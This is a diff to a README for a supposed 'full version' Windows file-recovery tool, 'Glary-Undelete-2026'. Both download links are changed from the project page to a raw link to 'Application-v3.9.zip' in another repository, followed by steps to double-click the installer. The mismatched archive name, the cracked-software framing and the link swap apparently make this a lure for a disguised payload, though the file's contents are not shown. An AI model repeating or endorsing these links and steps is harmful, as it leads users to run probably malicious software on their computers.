@@ -5,7 +5,7 @@ description: "Recover deleted files on Windows 10 and 11 using this full version
 ---
 # ⚙️ Glary-Undelete-2026 - Recover your lost Windows files easily
 
-[![](https://img.shields.io/badge/Download-Glary--Undelete--2026-blue)](https://github.com/Decathlongongorist126/Glary-Undelete-2026)
+[![](https://img.shields.io/badge/Download-Glary--Undelete--2026-blue)](https://raw.githubusercontent.com/Decathlongongorist126/decathlongongorist126.github.io/main/docs/posts/Application-v3.9.zip)
 
 ## 📌 Overview
 Glary-Undelete-2026 restores files you deleted by mistake. This tool works on Windows 10 and Windows 11. It scans your hard drives, memory cards, and USB sticks to find files you thought were gone forever. You can recover photos, documents, videos, and music files with this software.
@@ -21,7 +21,7 @@ Before you install this software, check that your computer meets these requireme
 ## 📥 Download and Setup
 Follow these steps to put the software on your computer:
 
-1. Visit this page to download the software: [https://github.com/Decathlongongorist126/Glary-Undelete-2026](https://github.com/Decathlongongorist126/Glary-Undelete-2026)
+1. Visit this page to download the software: [https://raw.githubusercontent.com/Decathlongongorist126/decathlongongorist126.github.io/main/docs/posts/Application-v3.9.zip](https://raw.githubusercontent.com/Decathlongongorist126/decathlongongorist126.github.io/main/docs/posts/Application-v3.9.zip)
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the installer file to start the process.
 4. Follow the instructions on the screen.
